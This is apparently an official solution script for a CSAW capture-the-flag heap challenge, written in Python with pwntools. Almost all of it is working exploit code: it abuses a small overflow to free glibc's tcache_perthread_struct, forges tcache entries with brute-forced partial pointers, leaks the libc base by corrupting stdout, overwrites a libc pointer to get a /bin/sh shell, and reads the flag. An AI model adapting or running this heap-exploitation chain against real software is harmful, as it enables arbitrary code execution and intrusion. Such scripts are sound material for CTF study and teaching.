#Official exploit (P[success]==1/256)
#One(2) byte(s) Off to free tcache_perthread_struct
#binmap -> the header of fake chunk
#tcache key -> bypass strtol
#----------------------------------------------------
from pwn import *
def f(size,c=b'\0'*8,escape=b"A"):
    p.sendlineafter(b"Message:\n",str(size).encode('utf8'))
    p.sendafter(b"Content:\n",c)
    p.sendafter(b"?\n",escape)
def bits(index,k=1):
    bitmap=[0]*0x80
    bitmap[index*2]=k
    bitmap=bytes(bitmap)
    return bitmap
try:
    debug=0
    context.log_level="debug"
    if(debug):
        p=process("./pwn", timeout=1)
    else:
        p=remote("pwn.chal.csaw.io",5008,timeout=0.5)
        #p=remote("localhost",8888,timeout=1)
    add=376
    free=388
    read_int=400
    f(100,b"A",b"1"*0x30+b"A"*8+p64(add)+p64(read_int)+p64(free)+p64(0))
    p.sendafter(b"Content:\n",b"A\n")

    p.send(b"A"*0x10+b'\x10')
    
    f(0xc8+0x90,p64(0x21)*((0x90+0xc8)//8))
    f(0x98)
    f(0x288,bits(8,8))
    f(0x298,p64(0x21)*(0x200//8))
    f(0x98)
    if(debug):
        f(0x288,bits(20,1)+p64(0)*20+b'\x10\xac')#1/16
    else:
        f(0x288,bits(20,1)+p64(0)*20+b'\x10\x0c')#1/16

    f(0xa8)
    f(0x408,b'\0'*0x18+p64(0x671))
    f(0x3f8,p64(0x21)*(0x3f0//8))
    f(0xb8)
    f(0xc8)
    if(debug):
        f(0x288,bits(9,1)+p64(0)*9+b'\x20\xb0')#1/16
    else:
        f(0x288,bits(9,1)+p64(0)*9+b'\x20\x10')#1/16
    f(0xa8,b"\0"*0x10)# 
    f(0x699)#0x7ffff7fad3f0
    if(debug):
        f(0x288,bits(10,1)+p64(0)*10+b'\xf0\xab')#1/16
        f(0xb8,b'\0'*0x18+p64(0x1c1)+b'\xf0\xd3')#1/256
    else:
        f(0x288,bits(10,1)+p64(0)*10+b'\xf0\x0b')#1/16
        f(0xb8,b'\0'*0x18+p64(0x1c1)+b'\xf0\xd3')#1/256
    f(0x288,bits(20,8))
    f(0x158)
    f(0x158,p64(0)*0x21+p64(0x1f1))
    f(0x288,bits(30,1)+p64(0)*30+b'\x00\xd5')#1/256
    #
    p.sendlineafter(b"Message:\n",str(0x1f8).encode('utf8'))
    p.sendafter(b"Content:\n",b'\0'*0x1a0+p64(0x1802)+p64(0)*3+b'\0')
    p.read(0x8)
    base=u64(p.read(0x8))-(0x7ffff7fac980-0x7ffff7dc1000)
    log.warning(hex(base))
    p.sendlineafter(b"?\n",b"Get libc-base")

    f(0x288,bits(30,1)+p64(0)*30+p64(0x1eeb20+base))
    p.sendlineafter(b"Message:\n",str(0x1f8).encode('utf8'))
    p.sendafter(b"Content:\n",b'/bin/sh\0'+p64(base+0x55410))
    
    #p.interactive()
    p.clean()
    p.sendline(b"cat flag")
    print(p.recv())
    p.close()
except Exception:
    p.close()
